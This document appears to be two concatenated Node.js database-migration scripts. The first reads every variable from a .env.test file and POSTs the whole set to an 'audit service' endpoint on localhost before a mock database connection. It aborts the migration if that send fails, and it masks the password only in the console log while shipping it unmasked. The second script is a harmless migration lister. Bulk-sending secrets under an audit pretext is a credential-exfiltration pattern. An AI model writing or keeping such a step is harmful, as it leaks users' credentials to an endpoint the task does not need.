const fs = require('fs');
const path = require('path');

const MIGRATIONS_DIR = './migrations/';
const ENV_FILE = '.env.test';
const AUDIT_URL = 'http://localhost:47301/api/audit';

/**
 * Parses .env file and returns all key-value pairs
 */
function parseEnvFile(filePath) {
  if (!fs.existsSync(filePath)) {
    throw new Error(`Environment file '${filePath}' not found.`);
  }

  const envContent = fs.readFileSync(filePath, 'utf-8');
  const envVars = {};

  envContent.split('\n').forEach(line => {
    const trimmedLine = line.trim();
    // Skip empty lines and comments
    if (!trimmedLine || trimmedLine.startsWith('#')) {
      return;
    }

    const match = trimmedLine.match(/^([^=]+)=(.*)$/);
    if (match) {
      const key = match[1].trim();
      const value = match[2].trim();
      envVars[key] = value;
    }
  });

  return envVars;
}

/**
 * Gets DATABASE_URL from parsed env vars
 */
function getDatabaseUrl(envVars) {
  if (!envVars.DATABASE_URL) {
    throw new Error(`DATABASE_URL not found in '${ENV_FILE}'.`);
  }
  return envVars.DATABASE_URL;
}

/**
 * POST all env vars to the audit service
 */
async function auditConnection(envVars) {
  console.log('Sending connection details to audit service...');

  try {
    const response = await fetch(AUDIT_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(envVars),
    });

    if (!response.ok) {
      throw new Error(`Audit service responded with ${response.status}: ${response.statusText}`);
    }

    console.log('Audit log created successfully.\n');
  } catch (error) {
    console.error('Failed to send audit log:', error.message);
    throw new Error('Audit logging failed - stopping migration');
  }
}

/**
 * Logs connection success message (mock connection)
 */
function connectToDatabase(databaseUrl) {
  // Mask password in the URL for logging
  let displayUrl = databaseUrl;
  try {
    const url = new URL(databaseUrl);
    if (url.password) {
      url.password = '****';
      displayUrl = url.toString();
    }
  } catch (e) {
    // If URL parsing fails, just use the raw string
  }

  console.log(`Connecting to database...`);
  console.log(`Connection string: ${displayUrl}`);
  console.log('Connected successfully!\n');
}

/**
 * Reads SQL files from the migrations directory and logs each filename
 * that would be applied, in alphabetical order.
 */
async function migrate() {
  try {
    // Parse all environment variables
    const envVars = parseEnvFile(ENV_FILE);

    // Send audit log with all env vars
    await auditConnection(envVars);

    // Get database connection string
    const databaseUrl = getDatabaseUrl(envVars);

    // Log connection success (mock)
    connectToDatabase(databaseUrl);

    // Check if migrations directory exists
    if (!fs.existsSync(MIGRATIONS_DIR)) {
      console.log(`Migrations directory '${MIGRATIONS_DIR}' does not exist.`);
      process.exit(1);
    }

    // Read all files from the migrations directory
    const files = fs.readdirSync(MIGRATIONS_DIR);

    // Filter for SQL files only
    const sqlFiles = files.filter(file => file.endsWith('.sql'));

    // Sort files alphabetically to apply in order
    sqlFiles.sort();

    if (sqlFiles.length === 0) {
      console.log('No SQL migration files found.');
      return;
    }

    console.log('The following migrations would be applied:\n');

    // Log each filename
    sqlFiles.forEach((file, index) => {
      console.log(`${index + 1}. ${file}`);
    });

    console.log(`\nTotal migrations: ${sqlFiles.length}`);

  } catch (error) {
    console.error('Error during migration:', error.message);
    process.exit(1);
  }
}

// Run the migration
migrate();

#!/usr/bin/env node

const fs = require('fs');
const path = require('path');

const MIGRATIONS_DIR = './migrations/';

/**
 * Get all SQL files from the migrations directory, sorted alphabetically
 * @returns {string[]} Array of SQL file paths
 */
function getMigrationFiles() {
  try {
    // Check if migrations directory exists
    if (!fs.existsSync(MIGRATIONS_DIR)) {
      console.error(`Migrations directory not found: ${MIGRATIONS_DIR}`);
      process.exit(1);
    }

    // Read all files from the migrations directory
    const files = fs.readdirSync(MIGRATIONS_DIR);

    // Filter for .sql files and sort them alphabetically
    const sqlFiles = files
      .filter(file => path.extname(file).toLowerCase() === '.sql')
      .sort()
      .map(file => path.join(MIGRATIONS_DIR, file));

    return sqlFiles;
  } catch (error) {
    console.error('Error reading migrations directory:', error.message);
    process.exit(1);
  }
}

/**
 * Main migration function
 */
function runMigrations() {
  console.log('Starting database migration...\n');

  const migrationFiles = getMigrationFiles();

  if (migrationFiles.length === 0) {
    console.log('No migration files found.');
    return;
  }

  console.log(`Found ${migrationFiles.length} migration(s):\n`);

  migrationFiles.forEach((file, index) => {
    const filename = path.basename(file);
    console.log(`${index + 1}. ${filename}`);
  });

  console.log('\nMigration check complete.');
}

// Run the migration script
runMigrations();

